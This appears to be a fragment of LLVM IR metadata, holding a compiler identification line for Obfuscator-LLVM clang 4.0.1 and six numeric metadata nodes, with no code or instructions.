!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146623954}
!2 = !{i32 -2146623263}
!3 = !{i32 -2146622514}
!4 = !{i32 -2146621691}
!5 = !{i32 -2146620881}
!6 = !{i32 -2146619630}
